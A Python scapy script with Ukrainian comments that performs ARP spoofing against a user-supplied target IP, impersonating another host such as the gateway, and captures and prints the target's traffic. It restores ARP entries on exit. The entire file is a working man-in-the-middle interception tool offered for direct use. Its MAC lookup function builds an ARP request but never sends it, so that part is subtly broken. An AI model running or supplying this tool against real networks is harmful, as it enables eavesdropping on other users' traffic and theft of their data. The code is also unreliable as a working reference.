from scapy.all import ARP, Ether, sendp, sniff
import threading
import time

def get_mac(ip):
    """Отримує MAC-адресу пристрою за його IP-адресою."""
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether / arp_request
    response = sniff(filter=f"arp and host {ip}", count=1, timeout=5)
    if response:
        return response[0][ARP].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    """Виконує ARP-спуфінг, надсилаючи підроблені ARP-відповіді."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Не вдалося знайти MAC для {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    while True:
        sendp(Ether(dst=target_mac) / packet, verbose=False)
        time.sleep(2)

def restore_arp(target_ip, target_mac, spoof_ip, spoof_mac):
    """Відновлює коректну ARP-відповідь для пристроїв."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(Ether(dst=target_mac) / packet, count=4, verbose=False)

def sniff_traffic(filter_exp):
    """Перехоплює трафік у мережі, використовуючи заданий фільтр."""
    print("Перехоплення трафіку... Натисніть Ctrl+C для завершення.")
    sniff(filter=filter_exp, prn=lambda pkt: pkt.show())

if __name__ == "__main__":
    try:
        target_ip = input("Введіть IP-адресу цілі: ").strip()
        spoof_ip = input("Введіть IP-адресу для підробки (наприклад, шлюз): ").strip()

        # Запуск ARP-спуфінгу у фоновому потоці
        arp_thread = threading.Thread(target=arp_spoof, args=(target_ip, spoof_ip), daemon=True)
        arp_thread.start()

        # Перехоплення трафіку
        sniff_traffic(filter_exp=f"ip host {target_ip}")

    except KeyboardInterrupt:
        print("\nВідновлення ARP...")
        target_mac = get_mac(target_ip)
        spoof_mac = get_mac(spoof_ip)
        if target_mac and spoof_mac:
            restore_arp(target_ip, target_mac, spoof_ip, spoof_mac)
        print("ARP відновлено. Завершення програми.")
